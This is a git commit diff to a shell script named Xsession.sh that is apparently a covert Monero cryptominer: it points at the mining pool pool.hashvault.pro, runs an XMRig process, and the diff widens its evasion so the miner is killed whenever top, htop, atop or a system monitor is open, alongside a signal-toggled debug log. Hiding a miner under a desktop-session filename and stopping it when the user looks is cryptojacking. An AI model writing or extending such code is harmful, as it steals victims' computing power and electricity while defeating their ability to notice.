5f7b78a5b8165c3cd8a47f7bbe600cfd56cf66ab
vladimir <vladimir@playsnook.com>
2024-09-19 01:11:05 +0300

    Added debug thorugh sig

--- Xsession.sh
+++ Xsession.sh
@@ -8,6 +8,28 @@ LOCAL_PATH=$HOME/.local/bin
 POOL=pool.hashvault.pro:80
 INACTIVITY_IN_MINS=1
 INACTIVITY_IN_MSEC=$(($INACTIVITY_IN_MINS * 60 * 1000))
+LOG_FILE="/tmp/me.log"
+DEBUG=0
+
+toggle_debug() {
+  if [[ $DEBUG -eq 0 ]]; then
+  	DEBUG=1
+  	echo "Debugging ON" >> "$LOG_FILE"
+  else
+    DEBUG=0
+    echo "Debugging OFF" >> "$LOG_FILE"
+  fi
+}
+
+trap 'toggle_debug' SIGUSR1
+
+# Function to log messages if DEBUG is on
+log_message() {
+  if [[ $DEBUG -eq 1 ]]; then
+    echo "$(date): $1" >> "$LOG_FILE"
+  fi
+}
+
 
 ensure_os() {
 	machine=$(uname -m)
@@ -29,17 +51,22 @@ run_xmr() {
 }
 
 
+
 main() {
 	ensure_os
 
 	isUI=$(who | grep -q "(:[0-9])" && echo 1 || echo 0)
 
+	me=$(whoami)
+	myproc=$(ps -a)
+	log_message $me
+	log_message "$myproc"
+
+
 	while true; do 
 		sleep 1
 
-		#if pgrep "top" || pgrep "htop" || pgrep "atop" || pgrep "mate-system-mon"; then
-		if pgrep "top"; then
-			echo Found top >$LOCAL_PATH/my.log
+		if pgrep "top" || pgrep "htop" || pgrep "atop" || pgrep "mate-system-mon"; then
 			pkill $XMRIGNAME
 			continue
 		fi
